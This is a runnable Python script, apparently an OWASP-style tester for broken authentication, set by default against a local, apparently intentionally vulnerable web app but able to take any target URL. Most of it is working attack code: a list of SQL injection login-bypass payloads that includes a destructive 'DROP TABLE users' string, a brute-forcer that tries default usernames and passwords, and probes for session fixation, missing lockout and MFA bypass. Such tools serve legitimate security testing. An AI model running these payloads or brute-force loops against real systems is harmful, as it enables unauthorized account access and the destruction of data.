#!/usr/bin/env python3

import requests
import time
import sys
import json
from itertools import product
from concurrent.futures import ThreadPoolExecutor
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class BruteForceAuth:
    def __init__(self, target_url="http://localhost:3000"):
        self.target_url = target_url.rstrip('/')
        self.login_url = f"{self.target_url}/login"
        self.session = requests.Session()
        self.vulnerabilities_found = []
        
        # Extended username/password combinations
        self.usernames = [
            'admin', 'administrator', 'user', 'test', 'guest', 
            'root', 'demo', 'sa', 'support', 'manager', 'superuser',
            'operator', 'service', 'postgres', 'mysql', 'oracle',
            'tomcat', 'jenkins', 'weblogic', 'jboss', 'websphere'
        ]
        
        self.passwords = [
            'admin', 'password', '123456', 'password123', 'admin123',
            'test', 'guest', 'root', 'demo', '12345', 'qwerty',
            'letmein', 'welcome', 'monkey', 'dragon', '123456789',
            'football', 'iloveyou', 'adobe123', 'password1',
            'secret', 'changeme', 'default', 'administrator'
        ]
    
    def banner(self):
        print("=" * 80)
        print("🔐 BROKEN AUTHENTICATION & SESSION MANAGEMENT TESTER")
        print("=" * 80)
        print(f"Target: {self.target_url}")
        print(f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)
    
    def test_login(self, username, password):
        """Test a single login attempt with enhanced detection"""
        try:
            data = {
                'username': username,
                'password': password
            }
            
            start_time = time.time()
            response = self.session.post(self.login_url, data=data, allow_redirects=False, timeout=10)
            response_time = time.time() - start_time
            
            # Enhanced success indicators
            success_indicators = [
                'dashboard', 'welcome', 'logout', 'profile', 'home',
                'success', 'authenticated', 'logged in', 'user panel'
            ]
            
            # Enhanced failure indicators
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'error', 'wrong',
                'denied', 'unauthorized', 'forbidden', 'bad credentials'
            ]
            
            response_text = response.text.lower()
            
            # Check redirect (302/301 usually means success)
            if response.status_code in [302, 301]:
                location = response.headers.get('Location', '').lower()
                if any(indicator in location for indicator in ['dashboard', 'profile', 'home', 'admin']):
                    return True, f"Redirect to {location}"
                elif 'login' in location or 'error' in location:
                    return False, "Redirect to login/error page"
                else:
                    return True, f"Redirect detected: {location}"
            
            # Check response content
            if any(indicator in response_text for indicator in success_indicators):
                return True, "Success indicator found"
            
            if any(indicator in response_text for indicator in failure_indicators):
                return False, "Failure indicator found"
            
            # Check for time-based anomalies
            if response_time > 3:
                return None, f"Slow response ({response_time:.2f}s) - potential time-based attack"
            
            # Status code analysis
            if response.status_code == 200:
                if len(response.text) > 5000:  # Large response might indicate dashboard
                    return None, "Large response - manual verification needed"
                return None, "Unclear - manual verification needed"
            
            return False, f"Status code: {response.status_code}"
            
        except requests.exceptions.RequestException as e:
            return False, f"Request error: {e}"
    
    def test_sql_injection_bypass(self):
        """Enhanced SQL injection authentication bypass test"""
        print("\n🔍 [1/7] Testing SQL Injection Authentication Bypass...")
        
        sql_payloads = [
            ("admin'--", "Basic comment bypass"),
            ("admin' OR '1'='1'--", "Basic OR injection"),
            ("admin' OR 1=1#", "MySQL comment bypass"),
            ("' OR ''='", "Empty string bypass"),
            ("' OR 1=1--", "Direct OR bypass"),
            ("admin') OR ('1'='1'--", "Parentheses bypass"),
            ("admin' OR 'x'='x", "String comparison bypass"),
            ("') OR ('1'='1", "Double parentheses bypass"),
            ("admin' UNION SELECT 1,2,3,4,5--", "UNION injection"),
            ("admin'; DROP TABLE users; --", "Destructive injection test"),
            ("admin' AND (SELECT COUNT(*) FROM users) > 0--", "Blind injection"),
            ("admin' OR SLEEP(5)--", "Time-based injection"),
            ("admin' OR pg_sleep(5)--", "PostgreSQL time-based"),
            ("admin' OR WAITFOR DELAY '00:00:05'--", "SQL Server time-based"),
            ("admin' OR 1=1 LIMIT 1--", "Limit bypass"),
            ("admin'/**/OR/**/1=1--", "Comment obfuscation"),
            ("admin'+OR+'1'='1'--", "Plus encoding"),
            ("admin%27+OR+%271%27%3D%271%27--", "URL encoding")
        ]
        
        found_sqli = False
        
        for payload, desc in sql_payloads:
            print(f"   Testing: {desc}")
            
            start_time = time.time()
            success, message = self.test_login(payload, "anything")
            response_time = time.time() - start_time
            
            if success:
                print(f"   ✅ SUCCESS! {desc} - {payload}")
                self.vulnerabilities_found.append(f"SQL Injection bypass - {desc}")
                found_sqli = True
            elif "time-based" in desc.lower() and response_time > 4:
                print(f"   ✅ TIME-BASED SQLi! {desc} - Delay: {response_time:.2f}s")
                self.vulnerabilities_found.append(f"Time-based SQL Injection - {desc}")
                found_sqli = True
            elif success is None:
                print(f"   ⚠️  UNCLEAR: {desc} - {message}")
            else:
                print(f"   ❌ Failed: {desc}")
            
            time.sleep(0.3)
        
        print(f"   📊 SQL Injection tests completed. Found: {len([v for v in self.vulnerabilities_found if 'SQL' in v])}")
        return found_sqli
    
    def test_weak_credentials(self):
        """Enhanced weak credentials testing with threading"""
        print("\n🔍 [2/7] Testing Weak Credentials...")
        
        found_credentials = []
        test_count = 0
        max_tests = 100  # Limit to prevent overwhelming
        
        def test_credential_pair(username, password):
            nonlocal test_count
            test_count += 1
            if test_count > max_tests:
                return None
                
            print(f"   [{test_count:3d}] Testing: {username}:{password}")
            success, message = self.test_login(username, password)
            
            if success:
                print(f"   ✅ SUCCESS! Found credentials: {username}:{password}")
                found_credentials.append((username, password))
                self.vulnerabilities_found.append(f"Weak credentials - {username}:{password}")
            elif success is None:
                print(f"   ⚠️  UNCLEAR: {username}:{password} - {message}")
            
            time.sleep(0.2)
            return success
        
        # Test most common combinations first
        priority_combinations = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('admin', 'admin123'), ('root', 'root'), ('user', 'user'),
            ('test', 'test'), ('guest', 'guest'), ('demo', 'demo')
        ]
        
        print("   🎯 Testing priority combinations...")
        for username, password in priority_combinations:
            if test_credential_pair(username, password):
                break
        
        # If no success with priority, test more combinations
        if not found_credentials and test_count < max_tests:
            print("   🔄 Testing additional combinations...")
            for username, password in product(self.usernames[:10], self.passwords[:10]):
                if (username, password) not in priority_combinations:
                    if test_credential_pair(username, password):
                        break
                    if test_count >= max_tests:
                        break
        
        print(f"   📊 Credential tests completed. Found: {len(found_credentials)} valid combinations")
        return found_credentials
    
    def test_session_management(self):
        """Enhanced session management vulnerability testing"""
        print("\n🔍 [3/7] Testing Session Management Vulnerabilities...")
        
        # Test 1: Session fixation
        print("   🍪 Testing session fixation...")
        
        initial_session = requests.Session()
        response1 = initial_session.get(self.login_url)
        initial_cookies = dict(initial_session.cookies)
        
        login_data = {'username': 'admin', 'password': 'admin'}
        response2 = initial_session.post(self.login_url, data=login_data)
        after_login_cookies = dict(initial_session.cookies)
        
        if initial_cookies and after_login_cookies:
            session_changed = False
            for cookie_name in initial_cookies:
                if cookie_name in after_login_cookies:
                    if initial_cookies[cookie_name] != after_login_cookies[cookie_name]:
                        session_changed = True
                        break
            
            if not session_changed:
                print("   ⚠️  VULNERABILITY: Session fixation - Session ID didn't change after login")
                self.vulnerabilities_found.append("Session fixation vulnerability")
            else:
                print("   ✅ Session ID properly regenerated after login")
        
        # Test 2: Session cookie security
        print("   🔒 Testing session cookie security...")
        
        if after_login_cookies:
            for cookie_name, cookie_value in after_login_cookies.items():
                cookie_obj = None
                for cookie in initial_session.cookies:
                    if cookie.name == cookie_name:
                        cookie_obj = cookie
                        break
                
                if cookie_obj:
                    print(f"   Cookie: {cookie_name}")
                    
                    if not cookie_obj.secure:
                        print(f"     ⚠️  Missing Secure flag")
                        self.vulnerabilities_found.append(f"Insecure cookie - {cookie_name} (no Secure flag)")
                    else:
                        print(f"     ✅ Secure flag present")
                    
                    if not hasattr(cookie_obj, 'httponly') or not cookie_obj.has_nonstandard_attr('HttpOnly'):
                        print(f"     ⚠️  Missing HttpOnly flag")
                        self.vulnerabilities_found.append(f"Non-HttpOnly cookie - {cookie_name}")
                    else:
                        print(f"     ✅ HttpOnly flag present")
                    
                    if not cookie_obj.has_nonstandard_attr('SameSite'):
                        print(f"     ⚠️  Missing SameSite attribute")
                        self.vulnerabilities_found.append(f"Missing SameSite - {cookie_name}")
                    else:
                        print(f"     ✅ SameSite attribute present")
        
        # Test 3: Session timeout
        print("   ⏰ Testing session timeout...")
        
        if self.login_with_credentials('admin', 'admin'):
            print("   Waiting 5 seconds to test session timeout...")
            time.sleep(5)
            
            test_response = self.session.get(f"{self.target_url}/dashboard")
            if test_response.status_code == 200 and 'dashboard' in test_response.text.lower():
                print("   ⚠️  Session still active after delay (check timeout configuration)")
            else:
                print("   ✅ Session timeout appears to be working")
        
        print(f"   📊 Session management tests completed.")
    
    def test_account_lockout(self):
        """Enhanced account lockout mechanism testing"""
        print("\n🔍 [4/7] Testing Account Lockout Mechanisms...")
        
        test_username = "admin"
        wrong_password = "wrongpassword12345"
        
        print(f"   🔒 Testing lockout with user: {test_username}")
        
        lockout_detected = False
        attempt_count = 0
        max_attempts = 15
        
        for attempt in range(max_attempts):
            attempt_count = attempt + 1
            print(f"   [{attempt_count:2d}] Attempt: {test_username}:{wrong_password}")
            
            start_time = time.time()
            success, message = self.test_login(test_username, wrong_password)
            response_time = time.time() - start_time
            
            # Check for lockout indicators
            lockout_keywords = ['locked', 'too many', 'blocked', 'disabled', 'suspended', 'captcha']
            if any(keyword in message.lower() for keyword in lockout_keywords):
                print(f"   ✅ Account lockout detected after {attempt_count} attempts")
                lockout_detected = True
                break
            
            # Check for increasing response times (potential rate limiting)
            if response_time > 2:
                print(f"   ⚠️  Slow response ({response_time:.2f}s) - potential rate limiting")
            
            time.sleep(1)
        
        if not lockout_detected:
            print("   ⚠️  VULNERABILITY: No account lockout mechanism detected")
            self.vulnerabilities_found.append("No account lockout mechanism")
        
        print(f"   📊 Account lockout tests completed.")
    
    def test_password_reset_vulnerabilities(self):
        """Test password reset functionality for vulnerabilities"""
        print("\n🔍 [5/7] Testing Password Reset Vulnerabilities...")
        
        reset_endpoints = ['/forgot-password', '/reset-password', '/password-reset', '/forgot']
        
        for endpoint in reset_endpoints:
            try:
                response = self.session.get(f"{self.target_url}{endpoint}")
                if response.status_code == 200:
                    print(f"   ✅ Password reset endpoint found: {endpoint}")
                    
                    # Test for username enumeration
                    test_data = {'email': 'admin@example.com'}
                    reset_response = self.session.post(f"{self.target_url}{endpoint}", data=test_data)
                    
                    if 'user not found' in reset_response.text.lower():
                        print(f"   ⚠️  Username enumeration possible via reset form")
                        self.vulnerabilities_found.append("Username enumeration - password reset")
                    
                    break
            except:
                continue
        
        print(f"   📊 Password reset tests completed.")
    
    def test_multi_factor_bypass(self):
        """Test for multi-factor authentication bypass"""
        print("\n🔍 [6/7] Testing Multi-Factor Authentication Bypass...")
        
        # First, try to login with valid credentials
        if self.login_with_credentials('admin', 'admin'):
            print("   ✅ Successfully logged in")
            
            # Check if MFA is required
            dashboard_response = self.session.get(f"{self.target_url}/dashboard")
            
            if 'two-factor' in dashboard_response.text.lower() or 'mfa' in dashboard_response.text.lower():
                print("   🔍 MFA detected, testing bypass methods...")
                
                # Test direct endpoint access
                bypass_endpoints = ['/dashboard', '/profile', '/admin', '/api/users']
                
                for endpoint in bypass_endpoints:
                    try:
                        bypass_response = self.session.get(f"{self.target_url}{endpoint}")
                        if bypass_response.status_code == 200 and len(bypass_response.text) > 1000:
                            print(f"   ⚠️  MFA bypass possible: {endpoint}")
                            self.vulnerabilities_found.append(f"MFA bypass - {endpoint}")
                    except:
                        continue
            else:
                print("   ℹ️  No MFA detected")
        
        print(f"   📊 MFA bypass tests completed.")
    
    def test_concurrent_sessions(self):
        """Test for concurrent session vulnerabilities"""
        print("\n🔍 [7/7] Testing Concurrent Session Management...")
        
        if self.login_with_credentials('admin', 'admin'):
            print("   ✅ First session established")
            
            # Create second session with same credentials
            second_session = requests.Session()
            login_data = {'username': 'admin', 'password': 'admin'}
            
            second_response = second_session.post(self.login_url, data=login_data)
            
            if second_response.status_code in [200, 302]:
                print("   ✅ Second session established")
                
                # Test if both sessions are active
                first_test = self.session.get(f"{self.target_url}/dashboard")
                second_test = second_session.get(f"{self.target_url}/dashboard")
                
                if (first_test.status_code == 200 and 'dashboard' in first_test.text.lower() and
                    second_test.status_code == 200 and 'dashboard' in second_test.text.lower()):
                    print("   ⚠️  Multiple concurrent sessions allowed")
                    self.vulnerabilities_found.append("Concurrent sessions allowed")
                else:
                    print("   ✅ Concurrent sessions properly managed")
            else:
                print("   ℹ️  Could not establish second session")
        
        print(f"   📊 Concurrent session tests completed.")
    
    def login_with_credentials(self, username, password):
        """Helper method to login with specific credentials"""
        data = {'username': username, 'password': password}
        response = self.session.post(self.login_url, data=data)
        return response.status_code in [200, 302] and ('dashboard' in response.text.lower() or response.status_code == 302)
    
    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        print("\n" + "=" * 80)
        print("📋 AUTHENTICATION VULNERABILITY ASSESSMENT REPORT")
        print("=" * 80)
        
        print(f"🎯 Target: {self.target_url}")
        print(f"📅 Date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🔍 Total Vulnerabilities Found: {len(self.vulnerabilities_found)}")
        
        if self.vulnerabilities_found:
            print("\n🚨 AUTHENTICATION VULNERABILITIES IDENTIFIED:")
            print("-" * 60)
            
            vuln_categories = {}
            for vuln in self.vulnerabilities_found:
                category = vuln.split(' - ')[0] if ' - ' in vuln else vuln.split(' ')[0]
                if category not in vuln_categories:
                    vuln_categories[category] = []
                vuln_categories[category].append(vuln)
            
            for category, vulns in vuln_categories.items():
                print(f"\n📂 {category.upper()}:")
                for vuln in vulns:
                    print(f"   • {vuln}")
            
            # Risk assessment
            critical_vulns = [v for v in self.vulnerabilities_found if any(x in v.lower() for x in ['sql injection', 'bypass', 'weak credentials'])]
            high_vulns = [v for v in self.vulnerabilities_found if any(x in v.lower() for x in ['session', 'lockout', 'mfa'])]
            
            print(f"\n🔥 RISK ASSESSMENT:")
            if critical_vulns:
                print(f"   🚨 CRITICAL: {len(critical_vulns)} critical authentication vulnerabilities")
            if high_vulns:
                print(f"   ⚠️  HIGH: {len(high_vulns)} high-risk authentication issues")
            
        else:
            print("\n✅ No authentication vulnerabilities detected")
            print("   (This is unusual for intentionally vulnerable applications)")
        
        print("\n📝 AUTHENTICATION SECURITY RECOMMENDATIONS:")
        print("-" * 50)
        print("1. Implement strong password policies and complexity requirements")
        print("2. Use parameterized queries to prevent SQL injection")
        print("3. Implement account lockout after failed login attempts")
        print("4. Enable multi-factor authentication (MFA)")
        print("5. Secure session management with proper cookie flags")
        print("6. Implement session timeout and concurrent session limits")
        print("7. Use secure password reset mechanisms")
        print("8. Add CAPTCHA after multiple failed attempts")
        print("9. Implement comprehensive authentication logging")
        print("10. Regular security testing and penetration testing")
        
        print("\n" + "=" * 80)
    
    def save_results_to_file(self):
        """Save detailed results to JSON file"""
        try:
            report_data = {
                'target': self.target_url,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'test_type': 'Authentication Vulnerability Assessment',
                'vulnerabilities_found': self.vulnerabilities_found,
                'total_vulnerabilities': len(self.vulnerabilities_found),
                'risk_level': 'CRITICAL' if len(self.vulnerabilities_found) >= 5 else 'HIGH' if len(self.vulnerabilities_found) >= 3 else 'MEDIUM' if len(self.vulnerabilities_found) >= 1 else 'LOW'
            }
            
            filename = f"auth_vulnerability_report_{int(time.time())}.json"
            with open(filename, 'w') as f:
                json.dump(report_data, f, indent=2)
            
            print(f"💾 Detailed report saved to: {filename}")
            
        except Exception as e:
            print(f"❌ Error saving report: {str(e)}")
    
    def run_comprehensive_test(self):
        """Run all authentication vulnerability tests"""
        self.banner()
        
        try:
            print(f"\n🔄 Testing connectivity to {self.target_url}...")
            response = requests.get(self.target_url, timeout=5)
            if response.status_code != 200:
                print(f"❌ Target not accessible (Status: {response.status_code})")
                return
            print(f"✅ Target is accessible")
        except requests.exceptions.RequestException as e:
            print(f"❌ Cannot connect to target: {e}")
            return
        
        # Run all authentication tests
        self.test_sql_injection_bypass()
        self.test_weak_credentials()
        self.test_session_management()
        self.test_account_lockout()
        self.test_password_reset_vulnerabilities()
        self.test_multi_factor_bypass()
        self.test_concurrent_sessions()
        
        # Generate comprehensive report
        self.generate_report()
        
        # Save results
        self.save_results_to_file()

def main():
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        print("🔐 OWASP Top 10 - Broken Authentication Tester")
        print("=" * 50)
        print("Usage: python3 brute_force_auth.py <target_url>")
        print("Example: python3 brute_force_auth.py http://localhost:3000")
        print("\nThis tool will test for authentication vulnerabilities:")
        print("• SQL Injection Authentication Bypass")
        print("• Weak Credential Testing")
        print("• Session Management Issues")
        print("• Account Lockout Mechanisms")
        print("• Password Reset Vulnerabilities")
        print("• Multi-Factor Authentication Bypass")
        print("• Concurrent Session Management")
        sys.exit(1)
    
    tester = BruteForceAuth(target_url)
    tester.run_comprehensive_test()

if __name__ == "__main__":
    main()